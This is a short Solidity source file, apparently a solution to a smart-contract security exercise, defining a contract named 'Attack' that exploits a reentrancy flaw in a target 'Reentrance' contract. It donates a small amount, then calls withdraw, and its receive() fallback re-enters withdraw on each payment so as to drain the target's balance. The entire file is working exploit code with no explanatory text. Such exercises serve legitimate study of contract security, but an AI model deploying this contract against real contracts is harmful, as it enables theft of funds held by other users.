// SPDX-License-Identifier: MIT

pragma solidity 0.6.0;
interface Reentrance{
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Attack{
     Reentrance victime;

    constructor(address payable _victime) public payable {
        victime = Reentrance(_victime);
    }

    receive() external payable {
        victime.withdraw(0.001 * 10**18);
    }

    function attack() public payable {
        victime.donate.value(0.001 * 10**18)(address(this));
        victime.withdraw(0.001 * 10**18);
    }
}